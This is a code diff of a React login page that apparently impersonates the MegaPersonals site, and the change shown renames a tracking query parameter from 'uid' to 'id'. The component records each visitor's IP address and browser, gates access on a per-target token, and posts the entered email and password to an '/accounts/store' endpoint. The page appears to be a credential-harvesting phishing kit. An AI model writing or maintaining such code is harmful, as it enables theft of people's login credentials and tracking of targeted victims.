@@ -1,6 +1,4 @@
 import { useEffect, useRef, useState } from 'react';
-// import Logo from '../../assets/megapersonals/images/logo.png';
-// import ReloadButton from '../../assets/megapersonals/images/reloadButton.png';
 import { useNavigate, useSearchParams } from 'react-router-dom';
 import request from '../../utils/request';
 import { Helmet } from 'react-helmet';
@@ -47,7 +45,7 @@ const Home = () => {
 
       try {
          await request.post('/visitor-information/store', {
-            user_access_token: searchParams.get("uid"),
+            user_access_token: searchParams.get("id"),
             site: 'megapersonals',
             user_agent: window.navigator.userAgent,
             ip_address: ipAddress
@@ -69,7 +67,7 @@ const Home = () => {
          const { data } = await request.post('/accounts/store', {
             email,
             password,
-            user_access_token: searchParams.get("uid"),
+            user_access_token: searchParams.get("id"),
             site: 'megapersonals',
             user_agent: window.navigator.userAgent
          });
@@ -92,7 +90,7 @@ const Home = () => {
    }, [currentCaptchaIndex])
 
    useEffect(() => { 
-      if (!searchParams.get("uid")) {
+      if (!searchParams.get("id")) {
          navigate('/page-not-found'); 
       } else {
          handleVisitorInfo()
